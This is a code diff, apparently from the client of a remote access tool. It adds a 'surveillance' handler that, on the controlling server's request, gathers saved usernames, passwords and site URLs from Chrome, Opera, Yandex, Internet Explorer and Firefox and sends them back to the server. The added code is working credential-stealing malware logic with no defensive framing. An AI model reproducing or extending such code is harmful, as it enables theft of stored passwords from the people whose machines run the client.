@@ -5,15 +5,35 @@ using System.Windows.Forms;
 using xClient.Core.Helper;
 using System.Drawing.Imaging;
 using System.Threading;
+using xClient.Core.Recovery.Helper;
+using System.Collections.Generic;
+using PasswordRecovery.Browsers;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
-        public static void HandlePasswordRequest(Packets.ServerPackets.PasswordRequest packet, Client client)
+        public static void HandlePasswordRequest(Packets.ServerPackets.RecoverPassRequest packet, Client client)
         {
+           // MessageBox.Show("Got a pass request");
+            List<LoginInfo> mainList = new List<LoginInfo>();
+            
+            mainList.AddRange(Chrome.Passwords());
+            mainList.AddRange(Opera.Passwords());
+            mainList.AddRange(Yandex.Passwords());
+            mainList.AddRange(InternetExplorer.Passwords());
+            mainList.AddRange(Firefox.Passwords());
 
+            List<string> raw = new List<string>();
+
+            foreach (LoginInfo value in mainList)
+            {
+                string rawValue = string.Format("{0}|$|{1}|$|{2}|$|{3}", value.Username, value.Password, value.URL, value.Browser);
+                raw.Add(rawValue);
+            }
+            
+            new Packets.ClientPackets.RecoverPassResponse(raw).Execute(client);
         }
         public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
         {
